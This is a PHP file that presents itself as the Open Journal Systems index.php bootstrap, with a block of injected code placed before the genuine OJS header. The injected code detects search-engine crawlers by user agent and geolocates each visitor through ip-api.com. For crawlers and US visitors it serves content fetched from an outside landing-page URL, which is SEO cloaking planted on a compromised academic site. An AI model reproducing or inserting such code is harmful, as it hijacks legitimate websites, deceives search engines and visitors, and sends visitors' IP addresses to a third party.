<?php
function getUserCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $url = "http://ip-api.com/json/{$ip}";
    
    $response = @file_get_contents($url);
    if ($response) {
        $data = json_decode($response, true);
        return $data['countryCode'] ?? null;
    }
    return null;
}

function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
    
    return preg_match($botchar, $user_agent);
}

$Zhyven = "https://pmb.iainkudus.id/landing/disdik.palikab/";

if (is_bot()) {
    echo @file_get_contents($Zhyven);
    exit;
}

if (getUserCountry() === "US") {
    header("Content-Type: text/html; charset=UTF-8");
    echo @file_get_contents($Zhyven);
    exit();
}

?>

<?php

/**
 * @file ojs/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * Bootstrap code for OJS site. Loads required files and then calls the
 * dispatcher to delegate to the appropriate request handler.
 */

use APP\core\Application;

// Initialize global environment
define('INDEX_FILE_LOCATION', __FILE__);
require_once './lib/pkp/includes/bootstrap.php';

// Serve the request
Application::get()->execute();
